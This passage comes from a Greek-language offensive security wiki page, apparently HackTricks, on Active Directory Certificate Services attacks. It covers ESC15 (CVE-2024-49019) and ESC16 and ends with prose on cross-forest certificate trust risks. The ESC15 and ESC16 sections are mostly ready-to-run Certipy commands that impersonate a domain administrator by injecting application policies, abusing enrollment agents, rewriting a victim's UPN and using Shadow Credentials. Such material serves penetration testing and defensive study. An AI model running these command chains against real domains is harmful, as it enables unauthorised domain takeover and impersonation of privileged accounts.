Για πιο συγκεκριμένες μεθόδους επίθεσης σε διάφορα σενάρια, ανατρέξτε στα εξής: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Επεξήγηση

Η περιγραφή στο https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc είναι εξαιρετικά λεπτομερής. Παρακάτω παρατίθεται απόσπασμα από το αρχικό κείμενο.

> Using built-in default version 1 certificate templates, an attacker can craft a CSR to include application policies that are preferred over the configured Extended Key Usage attributes specified in the template. The only requirement is enrollment rights, and it can be used to generate client authentication, certificate request agent, and codesigning certificates using the **_WebServer_** template

### Κατάχρηση

Τα παρακάτω αναφέρονται σε [this link]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu),Click to see more detailed usage methods.

Η εντολή `find` του Certipy μπορεί να βοηθήσει στον εντοπισμό V1 templates που ενδέχεται να είναι επιρρεπείς στο ESC15 εάν ο CA δεν έχει επιδιορθωθεί.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Σενάριο A: Άμεση Προσποίηση μέσω Schannel

**Βήμα 1: Ζητήστε ένα πιστοποιητικό, εισάγοντας την "Client Authentication" Application Policy και το UPN του στόχου.** Ο επιτιθέμενος `attacker@corp.local` στοχεύει τον `administrator@corp.local` χρησιμοποιώντας το template "WebServer" V1 (το οποίο επιτρέπει subject που παρέχεται από τον enrollee).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: Το ευάλωτο V1 template με "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Ενέχει το OID `1.3.6.1.5.5.7.3.2` στην επέκταση Application Policies του CSR.
- `-upn 'administrator@corp.local'`: Ορίζει το UPN στο SAN για impersonation.

**Βήμα 2: Πιστοποιηθείτε μέσω Schannel (LDAPS) χρησιμοποιώντας το αποκτηθέν πιστοποιητικό.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Σενάριο B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse

**Βήμα 1: Request a certificate from a V1 template (with "Enrollee supplies subject"), injecting "Certificate Request Agent" Application Policy.** Αυτό το πιστοποιητικό προορίζεται για τον attacker (`attacker@corp.local`) ώστε να γίνει enrollment agent. Δεν καθορίζεται UPN για την ταυτότητα του attacker εδώ, καθώς ο στόχος είναι η ικανότητα του agent.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Εισάγει το OID `1.3.6.1.4.1.311.20.2.1`.

**Βήμα 2: Χρησιμοποιήστε το πιστοποιητικό "agent" για να ζητήσετε ένα πιστοποιητικό εκ μέρους ενός στοχευμένου χρήστη με προνόμια.** Πρόκειται για ένα βήμα τύπου ESC3, χρησιμοποιώντας το πιστοποιητικό από το Βήμα 1 ως το πιστοποιητικό "agent".
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Βήμα 3: Αυθεντικοποιηθείτε ως ο προνομιούχος χρήστης χρησιμοποιώντας το πιστοποιητικό "on-behalf-of".**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Απενεργοποιημένη Επέκταση Ασφαλείας στον CA (Παγκοσμίως)-ESC16

### Επεξήγηση

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** αναφέρεται στο σενάριο όπου, εάν η διαμόρφωση του AD CS δεν επιβάλλει την ένταξη της **szOID_NTDS_CA_SECURITY_EXT** επέκτασης σε όλα τα πιστοποιητικά, ένας επιτιθέμενος μπορεί να το εκμεταλλευτεί ως εξής:

1. Ζητώντας ένα πιστοποιητικό **without SID binding**.

2. Χρησιμοποιώντας αυτό το πιστοποιητικό **for authentication as any account**, π.χ. προσποιούμενος έναν λογαριασμό υψηλών προνομίων (π.χ., Domain Administrator).

Μπορείτε επίσης να ανατρέξετε σε αυτό το άρθρο για να μάθετε περισσότερα για την λεπτομερή αρχή:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### Κατάχρηση

Το ακόλουθο αναφέρεται σε [αυτόν τον σύνδεσμο](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally), Κάντε κλικ για να δείτε πιο λεπτομερείς μεθόδους χρήσης.

Για να προσδιορίσετε εάν το περιβάλλον Active Directory Certificate Services (AD CS) είναι ευάλωτο σε **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Βήμα 1: Ανάγνωση του αρχικού UPN του λογαριασμού θύματος (Προαιρετικό - για επαναφορά).
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Βήμα 2: Ενημερώστε το UPN του λογαριασμού του θύματος στο `sAMAccountName` του στοχευόμενου διαχειριστή.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Βήμα 3: (εάν χρειάζεται) Αποκτήστε διαπιστευτήρια για τον "victim" λογαριασμό (π.χ., μέσω Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Βήμα 4: Ζητήστε ένα πιστοποιητικό ως ο χρήστης "victim" από _οποιοδήποτε κατάλληλο client authentication template_ (π.χ. "User") στην CA που είναι ευάλωτη στο ESC16.** Επειδή η CA είναι ευάλωτη στο ESC16, θα παραλείψει αυτόματα την επέκταση ασφαλείας SID από το εκδοθέν πιστοποιητικό, ανεξάρτητα από τις συγκεκριμένες ρυθμίσεις του προτύπου για αυτήν την επέκταση. Ορίστε τη μεταβλητή περιβάλλοντος Kerberos credential cache (εντολή shell):
```bash
export KRB5CCNAME=victim.ccache
```
Στη συνέχεια, ζητήστε το πιστοποιητικό:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Βήμα 5: Επαναφέρετε το UPN του λογαριασμού "victim".**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Βήμα 6: Αυθεντικοποίηση ως ο διαχειριστής-στόχος.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Συμβιβασμός Forests με Πιστοποιητικά — Εξηγημένο σε Παθητική Φωνή

### Σπάσιμο των Forest Trusts από συμβιβασμένες CA

Η διαμόρφωση για **cross-forest enrollment** γίνεται σχετικά απλή. Το **root CA certificate** από το resource forest **δημοσιεύεται στα account forests** από τους διαχειριστές, και τα πιστοποιητικά της **enterprise CA** από το resource forest **προστίθενται στα `NTAuthCertificates` και AIA containers σε κάθε account forest**. Για να διευκρινιστεί, αυτή η ρύθμιση παραχωρεί στην **CA στο resource forest πλήρη έλεγχο** επί όλων των άλλων forests για τα οποία διαχειρίζεται το PKI. Εάν αυτή η CA **συμβιβαστεί από επιτιθέμενους**, πιστοποιητικά για όλους τους χρήστες τόσο στο resource όσο και στα account forests θα μπορούσαν να **πλαστογραφηθούν από αυτούς**, παραβιάζοντας έτσι τα όρια ασφάλειας του forest.

### Δικαιώματα Enrollment που Χορηγούνται σε foreign principals

Σε multi-forest περιβάλλοντα απαιτείται προσοχή σε Enterprise CAs που **publish certificate templates** τα οποία επιτρέπουν σε **Authenticated Users ή foreign principals** (χρήστες/ομάδες εξωτερικές στο forest στο οποίο ανήκει η Enterprise CA) δικαιώματα **enrollment και edit**.\
Κατά την authentication μέσω trust, το **Authenticated Users SID** προστίθεται στο token του χρήστη από το AD. Επομένως, αν ένα domain διαθέτει μια Enterprise CA με ένα template που **allows Authenticated Users enrollment rights**, ένα template θα μπορούσε ενδεχομένως να **εγγραφεί (enrolled) από χρήστη από διαφορετικό forest**. Ομοίως, εάν τα **enrollment rights** χορηγηθούν ρητώς σε ένα foreign principal από ένα template, δημιουργείται έτσι μια **cross-forest access-control relationship**, επιτρέποντας σε έναν principal από ένα forest να **enroll σε template από άλλο forest**.

Και τα δύο σενάρια οδηγούν σε **αύξηση της attack surface** από το ένα forest στο άλλο. Οι ρυθμίσεις του certificate template θα μπορούσαν να εκμεταλλευτούν από έναν επιτιθέμενο για να αποκτήσει επιπλέον προνόμια σε ένα foreign domain.


## References

- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../../banners/hacktricks-training.md}}
